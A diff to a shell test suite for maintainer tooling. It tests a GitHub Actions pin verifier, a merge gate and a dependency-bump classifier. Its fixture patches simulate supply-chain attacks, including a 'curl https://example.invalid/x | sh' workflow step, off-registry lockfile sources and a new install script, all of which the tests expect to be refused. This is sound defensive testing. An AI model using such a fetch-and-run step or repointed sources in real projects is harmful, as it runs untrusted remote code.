@@ -1514,7 +1514,7 @@ for _v in "$root"/profiles/*/verify.d/*.sh; do
     esac
 done
 # And doctor has to say "build", not "pull", for an image no registry holds.
-if grep -q 'podman build -t' "$root/bin/maintainer-doctor"; then
+if grep -qE 'podman build .*-t ' "$root/bin/maintainer-doctor"; then
     ok "doctor tells you how to build a missing locally-built suite image"
 else
     bad "doctor would tell you to pull an image no registry has"
@@ -3081,6 +3081,392 @@ if [ -f "$_sh" ]; then
         && bad "the shell suite image is $_img, and every -slim python image ships without git" \
         || ok "the shell suite image is not a -slim variant that drops git"
 fi
+
+# The specific one that cost the two runs.
+if [ -f "$_sh" ]; then
+    _needs="$(sed -n 's/^suite_needs() *{ *printf *.\([^\x27"]*\).*/\1/p' "$_sh")"
+    grep -qw yamllint <<<"$_needs" \
+        && ok "the sysknife shell suite declares yamllint, which its release tests drive" \
+        || bad "shell suite needs '$_needs' and no yamllint, while tests/release lint YAML"
+fi
+
+echo "== the pin verifier sees composite actions, not only workflows =="
+# sysknife#471 closed exactly this hole in sysknife's own gates: a `uses:` inside
+# a local composite action under .github/actions/ was linted by nothing, so an
+# unpinned reference could ride in through a file the scan never opened. This
+# repository's verifier had the same blind spot, and the comment at the top of
+# the script claims it covers "every `uses:` in .github/workflows" while the
+# supply chain is wider than that directory.
+vpc="$stub_dir/pincomposite"; rm -rf "$vpc"
+mkdir -p "$vpc/.github/workflows" "$vpc/.github/actions/setup"
+printf 'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1\n' \
+    > "$vpc/.github/workflows/x.yml"
+printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/setup-node@v6\n' \
+    > "$vpc/.github/actions/setup/action.yml"
+out="$(bash "$vp" "$vpc" 2>&1)"; rc=$?
+if [ "$rc" != 0 ] && grep -q 'actions/setup-node@v6' <<<"$out"; then
+    ok "an unpinned uses: inside a composite action fails the verifier"
+else
+    bad "a composite action hid a floating tag from the pin check (rc=$rc)"
+fi
+# A directory that exists and holds no action metadata is a scan that read
+# nothing, and a scan that read nothing must not print an all-clear.
+rm -f "$vpc/.github/actions/setup/action.yml"
+out="$(bash "$vp" "$vpc" 2>&1)"; rc=$?
+[ "$rc" != 0 ] \
+    && ok "an empty .github/actions directory is refused, not skipped" \
+    || bad "an actions directory with nothing in it passed as clean"
+# Absent is different from empty: a repository with no composite actions is
+# normal and must still pass.
+rm -rf "$vpc/.github/actions"
+make_stub gh "case \"\$*\" in
+  *git/ref/tags*object.type*) echo commit ;;
+  *git/ref/tags*object.sha*) echo 3d3c42e5aac5ba805825da76410c181273ba90b1 ;;
+  *) echo '' ;;
+esac"
+out="$(PATH="$stub_dir:$PATH" bash "$vp" "$vpc" 2>&1)"; rc=$?
+[ "$rc" = 0 ] \
+    && ok "a repository with no composite actions still passes" \
+    || bad "the absent-directory case was turned into a failure: $(tr -d '\n' <<<"$out" | cut -c1-120)"
+# And no workflow files at all is the same vacuous-scan shape.
+rm -f "$vpc/.github/workflows/x.yml"
+out="$(PATH="$stub_dir:$PATH" bash "$vp" "$vpc" 2>&1)"; rc=$?
+[ "$rc" != 0 ] \
+    && ok "a workflows directory with no workflow in it is refused" \
+    || bad "the verifier printed an all-clear over an empty workflow set"
+rm -f "$stub_dir/gh"
+
+echo "== updating a branch from main is not a change to the pull request =="
+# `git diff verified_head..new_head` is the two-dot trap: after GitHub's "Update
+# branch" the range holds everything MAIN gained, so the gate reported main's own
+# merged commits as "production code changed since the verified head" and refused
+# a pull request whose own patch had not moved. sysknife requires an up-to-date
+# branch before merging, so every merge hit this, and the way around it was
+# `gh pr merge --admin`, which skips the receipt entirely. A gate that a required
+# step invalidates is a gate people learn to bypass.
+#
+# What the receipt claims is about the pull request's contribution, so that is
+# what has to be compared: the merge of the verified head with today's main,
+# against the tree being merged. Identical means the author changed nothing,
+# including inside a conflict resolution, which is the part comparing commits
+# would miss.
+mt="$stub_dir/mergetree"; rm -rf "$mt"; mkdir -p "$mt"
+up="$mt/up"
+git init -q -b main "$up"
+git -C "$up" config user.email t@t; git -C "$up" config user.name t
+mkdir -p "$up/crates/x/src" "$up/crates/y/src"
+printf 'fn one() {}\n' > "$up/crates/x/src/lib.rs"
+printf 'fn two() {}\n' > "$up/crates/y/src/lib.rs"
+git -C "$up" add -A >/dev/null; git -C "$up" commit -qm base
+git -C "$up" checkout -q -b pr
+printf 'fn one() { work() }\n' > "$up/crates/x/src/lib.rs"
+git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "the pull request"
+pr_old="$(git -C "$up" rev-parse HEAD)"
+git -C "$up" checkout -q main
+printf 'fn two() { something_else() }\n' > "$up/crates/y/src/lib.rs"
+git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "main moved"
+git -C "$up" checkout -q pr
+git -C "$up" merge -q --no-edit main >/dev/null 2>&1
+pr_new="$(git -C "$up" rev-parse HEAD)"
+git -C "$up" update-ref refs/pull/9/head "$pr_new"
+git -C "$up" checkout -q main
+mt_repo="$mt/repo"; git clone -q "$up" "$mt_repo"
+mt_state="$mt/state"; mkdir -p "$mt_state"
+make_stub gh "case \"\$*\" in
+  *'auth switch'*) exit 0 ;;
+  *'api user'*) echo testuser ;;
+  *headRefOid*) echo $pr_new ;;
+  *mergeStateStatus*) echo CLEAN ;;
+  *reviewDecision*) echo APPROVED ;;
+  *'json files'*) echo crates/x/src/lib.rs ;;
+  *closingIssuesReferences*) echo '' ;;
+  *'json author'*) echo someone ;;
+  *'pr checks'*) echo '[{\"name\":\"rust\",\"bucket\":\"pass\"}]' ;;
+  *) echo '' ;;
+esac"
+mt_merge() {
+    PATH="$stub_dir:$PATH" MAINTAINER_STATE="$mt_state" MAINTAINER_ACCOUNT=testuser \
+        MAINTAINER_SLUG=o/r MAINTAINER_REPO="$mt_repo" MAINTAINER_POST=off \
+        PROD_GLOBS="crates/*/src/*" \
+        bash "$root/bin/maintainer-merge" "$@" 2>&1
+}
+mt_merge receipt 9 "$pr_old" "guard mutated, went red" >/dev/null 2>&1
+mout="$(mt_merge merge 9)"; mrc=$?
+if [ "$mrc" = 0 ]; then
+    ok "a branch updated from main still spends its receipt"
+else
+    bad "the gate read main's own commits as the pull request changing (rc=$mrc): $(tr -d '\n' <<<"$mout" | cut -c1-160)"
+fi
+# The other direction, which is the whole point of the check: the author pushes
+# production code after the receipt was earned, and the merge must refuse.
+git -C "$up" checkout -q pr
+printf 'fn one() { work(); and_more() }\n' > "$up/crates/x/src/lib.rs"
+git -C "$up" add -A >/dev/null; git -C "$up" commit -qm "more work"
+pr_newer="$(git -C "$up" rev-parse HEAD)"
+git -C "$up" update-ref refs/pull/9/head "$pr_newer"
+git -C "$up" checkout -q main
+make_stub gh "case \"\$*\" in
+  *'auth switch'*) exit 0 ;;
+  *'api user'*) echo testuser ;;
+  *headRefOid*) echo $pr_newer ;;
+  *mergeStateStatus*) echo CLEAN ;;
+  *reviewDecision*) echo APPROVED ;;
+  *'json files'*) echo crates/x/src/lib.rs ;;
+  *closingIssuesReferences*) echo '' ;;
+  *'json author'*) echo someone ;;
+  *'pr checks'*) echo '[{\"name\":\"rust\",\"bucket\":\"pass\"}]' ;;
+  *) echo '' ;;
+esac"
+mout="$(mt_merge merge 9)"; mrc=$?
+if [ "$mrc" != 0 ] && grep -q 'production code changed' <<<"$mout"; then
+    ok "a push of production code after the receipt still refuses"
+else
+    bad "the gate merged production code the receipt never covered (rc=$mrc)"
+fi
+rm -f "$stub_dir/gh"
+
+echo "== a pure dependency bump is gated, not waved through =="
+# A lockfile bump has no guard to mutate, so `verify` can never write a receipt
+# for one and `merge` refuses every dependabot pull request. On 2026-09-23 that
+# sent sysknife#492 and #495 around the gate with `gh pr merge --admin`, which is
+# the one path this tool exists to remove. The class does have a provable claim,
+# it is just a different one: nothing but dependency metadata changed, no new
+# download source appeared, and every action pin is the tag its comment names.
+cdb="$root/scripts/classify_dependency_bump.py"
+[ -f "$cdb" ] && ok "the dependency-bump classifier exists" \
+    || bad "no scripts/classify_dependency_bump.py"
+dep_case() {  # $1 = patch on stdin file, prints verdict json
+    python3 "$cdb" < "$1" 2>&1
+}
+dp="$stub_dir/dep"; mkdir -p "$dp"
+
+cat > "$dp/lock.patch" <<'PATCH'
+diff --git a/Cargo.lock b/Cargo.lock
+index 5d61b394..30a412b8 100644
+--- a/Cargo.lock
++++ b/Cargo.lock
+@@ -126,9 +126,9 @@ dependencies = [
+ [[package]]
+ name = "async-openai"
+-version = "0.41.3"
++version = "0.42.0"
+ source = "registry+https://github.com/rust-lang/crates.io-index"
+-checksum = "d72db2750faea2ca5edbf6d0c50277a89dc8f75f5e6ddd695ef30f75e335019b"
++checksum = "3540b785fcd10be9458fdd8db9a63ea5bcd4b191ef557eaf2730fe0c5881c3e8"
+ dependencies = [
+PATCH
+vout="$(dep_case "$dp/lock.patch")"
+grep -q '"verdict": "dependency-bump"' <<<"$vout" \
+    && ok "a version+checksum lockfile bump classifies as a dependency bump" \
+    || bad "a plain Cargo.lock bump was not recognised: $(tr -d '\n' <<<"$vout" | cut -c1-120)"
+
+cat > "$dp/git-source.patch" <<'PATCH'
+diff --git a/Cargo.lock b/Cargo.lock
+--- a/Cargo.lock
++++ b/Cargo.lock
+@@ -126,7 +126,7 @@
+ name = "async-openai"
+-version = "0.41.3"
++version = "0.42.0"
+-source = "registry+https://github.com/rust-lang/crates.io-index"
++source = "git+https://example.invalid/async-openai?rev=deadbeef"
+PATCH
+vout="$(dep_case "$dp/git-source.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" && grep -qi 'source' <<<"$vout" \
+    && ok "a lockfile that repoints a crate at a git source is refused" \
+    || bad "a non-crates.io source passed the classifier"
+
+cat > "$dp/code.patch" <<'PATCH'
+diff --git a/crates/x/src/lib.rs b/crates/x/src/lib.rs
+--- a/crates/x/src/lib.rs
++++ b/crates/x/src/lib.rs
+@@ -1,1 +1,1 @@
+-fn a() {}
++fn a() { unsafe { std::ptr::null_mut::<u8>().write(0) } }
+PATCH
+vout="$(dep_case "$dp/code.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && ok "a diff carrying source code is not a dependency bump" \
+    || bad "the classifier accepted a .rs change as a dependency bump"
+
+cat > "$dp/pin.patch" <<'PATCH'
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -299,7 +299,7 @@ jobs:
+       - name: Install cargo-nextest
+-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
++        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14
+PATCH
+vout="$(dep_case "$dp/pin.patch")"
+grep -q '"verdict": "dependency-bump"' <<<"$vout" \
+    && grep -q '76c2e6406e52637deed7160d77bded76bd83e06e' <<<"$vout" \
+    && grep -q 'v2.87.14' <<<"$vout" \
+    && ok "an action pin bump is a dependency bump and reports the pin to verify" \
+    || bad "the pin bump was not reported for tag verification: $(tr -d '\n' <<<"$vout" | cut -c1-140)"
+
+cat > "$dp/pin-plus.patch" <<'PATCH'
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -299,8 +299,8 @@ jobs:
+       - name: Install cargo-nextest
+-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
++        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14
++      - run: curl https://example.invalid/x | sh
+PATCH
+vout="$(dep_case "$dp/pin-plus.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && ok "a workflow change that is not only a pin is refused" \
+    || bad "an added workflow step rode along with a pin bump"
+
+cat > "$dp/unpinned.patch" <<'PATCH'
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -299,7 +299,7 @@ jobs:
+-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
++        uses: taiki-e/install-action@v2
+PATCH
+vout="$(dep_case "$dp/unpinned.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && ok "a bump that replaces a SHA pin with a floating tag is refused" \
+    || bad "an unpinned action reference passed as a dependency bump"
+
+cat > "$dp/npm.patch" <<'PATCH'
+diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
+--- a/apps/x/package-lock.json
++++ b/apps/x/package-lock.json
+@@ -1,6 +1,6 @@
+       "version": "1.2.5",
+-      "resolved": "https://registry.npmjs.org/a/-/a-1.2.5.tgz",
+-      "integrity": "sha512-DLe/i+l8ynIBY7XEQ191TeZvCoowIGa18R+dIV30GW7DiOtp74i/xX8hs8GUjW5ARV7VZuie3d6AumSmCwbeRA==",
++      "resolved": "https://registry.npmjs.org/a/-/a-1.2.9.tgz",
++      "integrity": "sha512-tNISae1QEf/vkb3xkRcjV5SEdzPE97We5IVaa2Z8jSszQPZ8U60B/YCYpw4QI7VidYsBtKavczXf+DyDs9WGxw==",
+PATCH
+vout="$(dep_case "$dp/npm.patch")"
+grep -q '"verdict": "dependency-bump"' <<<"$vout" \
+    && ok "an npm lockfile bump inside the registry classifies as a dependency bump" \
+    || bad "a registry.npmjs.org lockfile bump was refused: $(tr -d '\n' <<<"$vout" | cut -c1-120)"
+
+cat > "$dp/npm-offsite.patch" <<'PATCH'
+diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
+--- a/apps/x/package-lock.json
++++ b/apps/x/package-lock.json
+@@ -1,4 +1,4 @@
+-      "resolved": "https://registry.npmjs.org/a/-/a-1.2.5.tgz",
++      "resolved": "https://cdn.example.invalid/a/-/a-1.2.9.tgz",
+PATCH
+vout="$(dep_case "$dp/npm-offsite.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && ok "an npm tarball pulled from outside the registry is refused" \
+    || bad "a lockfile pointing at another host passed"
+
+cat > "$dp/npm-install-script.patch" <<'PATCH'
+diff --git a/apps/x/package-lock.json b/apps/x/package-lock.json
+--- a/apps/x/package-lock.json
++++ b/apps/x/package-lock.json
+@@ -1,4 +1,5 @@
+       "version": "1.2.9",
++      "hasInstallScript": true,
+PATCH
+vout="$(dep_case "$dp/npm-install-script.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && ok "a bump that newly runs an install script goes to a human" \
+    || bad "a package gaining an install script was waved through"
+
+# And the gate has to spend that classification: a dependency receipt is one an
+# unattended run may merge on, because the gate observed the checks itself.
+grep -q 'verify-deps' "$root/bin/maintainer-merge" \
+    && ok "maintainer-merge exposes verify-deps" \
+    || bad "no verify-deps subcommand"
+
+# End to end, because a subcommand that exists and a subcommand that works are
+# different claims and grep cannot tell them apart.
+dep_state="$stub_dir/depstate"; mkdir -p "$dep_state"
+dep_gate() {  # $1 = patch file, $2 = what `gh api .../commits/<tag>` answers
+    rm -f "$dep_state/receipts/9.json"
+    make_stub gh "case \"\$*\" in
+      *'auth switch'*) exit 0 ;;
+      *'api user'*) echo testuser ;;
+      *headRefOid*) echo cafe1234cafe1234 ;;
+      *'pr diff'*) cat '$1' ;;
+      *'api repos/'*) echo '$2' ;;
+    esac"
+    PATH="$stub_dir:$PATH" MAINTAINER_STATE="$dep_state" MAINTAINER_ACCOUNT=testuser \
+        MAINTAINER_SLUG=o/r MAINTAINER_REPO="$stub_dir/repo" \
+        MAINTAINER_SCRIPTS="$root/scripts" \
+        bash "$root/bin/maintainer-merge" verify-deps 9 cafe1234cafe1234 2>&1
+}
+dout="$(dep_gate "$dp/pin.patch" 76c2e6406e52637deed7160d77bded76bd83e06e)"; drc=$?
+if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
+   && grep -q '"kind": "dependency"' "$dep_state/receipts/9.json"; then
+    ok "verify-deps writes a dependency receipt when the pin is the tag it claims"
+else
+    bad "verify-deps earned no receipt for a clean pin bump (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-140)"
+fi
+dout="$(dep_gate "$dp/pin.patch" 0000000000000000000000000000000000000000)"; drc=$?
+if [ "$drc" != 0 ] && grep -q 'pin comment is not true' <<<"$dout" \
+   && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "verify-deps refuses when GitHub says the tag is another commit"
+else
+    bad "a pin whose comment names the wrong tag earned a receipt (rc=$drc)"
+fi
+dout="$(dep_gate "$dp/code.patch" deadbeef)"; drc=$?
+if [ "$drc" != 0 ] && grep -qi 'not a pure dependency bump' <<<"$dout"; then
+    ok "verify-deps sends a diff with source code back to the real gate"
+else
+    bad "verify-deps accepted a source change (rc=$drc)"
+fi
+rm -f "$stub_dir/gh"
+grep -qE 'observed\|dependency|dependency\|observed' "$root/bin/maintainer-merge" \
+    && ok "an unattended run may merge on a dependency receipt" \
+    || bad "a dependency receipt is still 'not observed' to cmd_merge"
+
+echo "== the built suite image on this host is the one the tree describes =="
+# sysknife#471 could not earn a receipt because the shell suite's image had no
+# yamllint. Adding it to the Containerfile changes nothing until somebody
+# rebuilds, and doctor could not tell an image built from today's recipe from
+# one built in August: `podman image exists` answers yes to both. So the build
+# stamps the recipe's hash on the image and doctor compares it.
+ih="$stub_dir/imghome"
+mkdir -p "$ih/.local/share/maintainer/profiles/p/verify.d" "$ih/.local/bin"
+cat > "$ih/.local/share/maintainer/profiles/p/verify.d/shell.sh" <<'SUITE'
+suite_image() { printf 'localhost/probe:1'; }
+suite_needs() { printf 'bash'; }
+SUITE
+printf 'FROM docker.io/library/busybox:latest
+'     > "$ih/.local/share/maintainer/profiles/p/verify.d/shell.Containerfile"
+: > "$ih/.local/share/maintainer/profiles/p/profile.env"
+img_recipe="$(sha256sum "$ih/.local/share/maintainer/profiles/p/verify.d/shell.Containerfile" | cut -d' ' -f1)"
+img_doctor() {  # $1 = what `podman image inspect` reports as the fingerprint
+    make_stub podman "case \"\$*\" in
+        *'image exists'*) exit 0 ;;
+        *'image inspect'*) printf '%s\\n' '$1'; exit 0 ;;
+        *) exit 0 ;;
+    esac"
+    PATH="$stub_dir:$PATH" HOME="$ih" MAINTAINER_PROFILE=p \
+        bash "$root/bin/maintainer-doctor" 2>&1
+}
+iout="$(img_doctor "0000000000000000000000000000000000000000000000000000000000000000")"
+grep -q 'was built from a different' <<<"$iout" \
+    && ok "doctor catches an image built from a recipe the tree no longer has" \
+    || bad "an image built from a stale Containerfile reads as healthy"
+iout="$(img_doctor '<no value>')"
+grep -qi 'fingerprint' <<<"$iout" \
+    && ok "doctor says so when an image carries no recipe fingerprint at all" \
+    || bad "an unlabelled image reads as in sync, which is the un-rebuilt case"
+iout="$(img_doctor "$img_recipe")"
+grep -q 'was built from a different' <<<"$iout" \
+    && bad "doctor reports drift for an image built from exactly this recipe" \
+    || ok "an image whose fingerprint matches the recipe raises nothing"
+grep -q 'maintainer.recipe=' "$root/bin/maintainer-doctor" \
+    && ok "doctor's rebuild command stamps the fingerprint it will later check" \
+    || bad "doctor tells you to build an image it cannot later recognise"
+rm -f "$stub_dir/podman"
+command -v podman >/dev/null 2>&1 \
+    && ok "the podman stub is gone, so the cases below see the real one" \
+    || noenv "no podman on this host; the container cases below will skip"
 
 echo "== the verify container can run a script the test itself wrote =="
 # sysknife#410's release test writes an "echoing scanner" stub into mktemp -d,
